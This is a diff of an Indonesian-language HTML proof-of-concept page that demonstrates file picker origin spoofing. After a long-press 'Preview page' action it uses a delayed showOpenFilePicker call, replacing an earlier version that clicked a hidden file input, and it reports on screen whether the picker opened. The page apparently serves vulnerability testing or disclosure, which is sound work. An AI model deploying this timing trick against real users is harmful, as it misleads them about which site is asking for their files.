@@ -1,32 +1,38 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC - SelectFileDialog Spoofing via EphemeralTab</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PoC — FSA picker via long-press + delay</title>
 </head>
 <body>
-    <h2>PoC: File Picker Origin Spoofing</h2>
-    <p>1. Klik kanan (atau tekan lama) tautan di bawah ini.</p>
-    <p>2. Pilih menu <b>"Preview page" (Pratinjau halaman)</b>.</p>
-    <p>3. Tunggu 5 detik saat pratinjau halaman terbuka.</p>
+<h2>File Picker Origin Spoofing</h2>
+<ol>
+  <li><b>Tekan lama</b> tautan di bawah → muncul menu.</li>
+  <li>Pilih <b>"Preview page / Pratinjau halaman"</b>.</li>
+  <li>Tunggu 3 detik — jangan sentuh apa pun.</li>
+</ol>
 
-    <br>
-    <!-- Tautan untuk memicu EphemeralTab -->
-    <a href="https://example.com">Tekan lama tautan ini untuk Preview Page</a>
+<a href="https://example.com" style="font-size:20px;">👉 Tekan lama tautan ini</a>
 
-    <!-- Input file tersembunyi -->
-    <input type="file" id="fileInput" style="display: none;">
+<hr>
+<div id="status" style="font-weight:bold; padding:8px; border:1px solid #888; min-height:22px;">
+  status: menunggu long-press…
+</div>
 
-    <script>
-        // Simulasi race condition / timing attack dari tab latar belakang
-        setTimeout(() => {
-            console.log("Triggering file picker from background page...");
-            const fileInput = document.getElementById('fileInput');
-            
-            // Mengaktifkan dialog file picker secara otomatis
-            fileInput.click();
-        }, 5000);
-    </script>
+<script>
+const s = document.getElementById('status');
+document.addEventListener("contextmenu", () => {
+  s.textContent = '✅ contextmenu terdeteksi → tunggu 3 detik…';
+  setTimeout(async () => {
+    try {
+      const [h] = await window.showOpenFilePicker();
+      s.textContent = '🔴 PICKER TERBUKA! File: ' + (h ? h.name : '(dipilih)');
+    } catch (e) {
+      s.textContent = '🟢 diblokir — ' + e.name + ': ' + e.message;
+    }
+  }, 3000);
+});
+</script>
 </body>
 </html>
